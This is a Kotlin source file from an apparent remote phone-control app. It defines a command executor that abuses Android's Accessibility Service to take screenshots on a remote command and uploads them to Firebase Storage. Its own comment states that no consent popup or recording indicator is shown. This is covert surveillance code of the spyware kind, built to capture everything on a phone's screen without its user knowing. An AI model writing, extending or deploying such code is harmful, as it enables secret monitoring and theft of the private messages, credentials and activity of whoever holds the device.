package com.remotephone.executor

import android.graphics.Bitmap
import android.util.Log
import com.remotephone.data.model.Command
import com.remotephone.data.model.CommandResult
import com.remotephone.data.model.ResultType
import com.remotephone.data.firebase.FirebaseCommandRepo
import com.remotephone.service.RemoteAccessibilityService
import java.io.ByteArrayOutputStream

/**
 * Executor that takes a silent screenshot using AccessibilityService (API 30+).
 * No user consent popup or screen recording indicator is shown.
 */
class ScreenshotExecutor(
    private val commandRepo: FirebaseCommandRepo,
    private val pairId: String
) : CommandExecutor {

    companion object {
        private const val TAG = "ScreenshotExecutor"
        private const val JPEG_QUALITY = 85
    }

    override suspend fun execute(command: Command): CommandResult {
        val accessibilityService = RemoteAccessibilityService.instance
            ?: return CommandResult(
                commandId = command.id,
                type = ResultType.TEXT,
                data = "Error: Accessibility Service not enabled. Please enable it in Settings."
            )

        return try {
            val bitmap = takeScreenshot(accessibilityService)
                ?: return CommandResult(
                    commandId = command.id,
                    type = ResultType.TEXT,
                    data = "Error: Screenshot capture failed"
                )

            // Compress bitmap to JPEG bytes
            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, outputStream)
            val imageBytes = outputStream.toByteArray()
            bitmap.recycle()

            // Upload to Firebase Storage
            val downloadUrl = commandRepo.uploadScreenshot(imageBytes)

            Log.d(TAG, "Screenshot uploaded: $downloadUrl")

            CommandResult(
                commandId = command.id,
                type = ResultType.SCREENSHOT,
                data = downloadUrl
            )
        } catch (e: Exception) {
            Log.e(TAG, "Screenshot failed", e)
            CommandResult(
                commandId = command.id,
                type = ResultType.TEXT,
                data = "Error: ${e.message}"
            )
        }
    }

    private suspend fun takeScreenshot(service: RemoteAccessibilityService): Bitmap? {
        return kotlinx.coroutines.suspendCancellableCoroutine { continuation ->
            service.takeScreenshot { bitmap ->
                if (continuation.isActive) {
                    continuation.resume(bitmap) {}
                }
            }
        }
    }
}
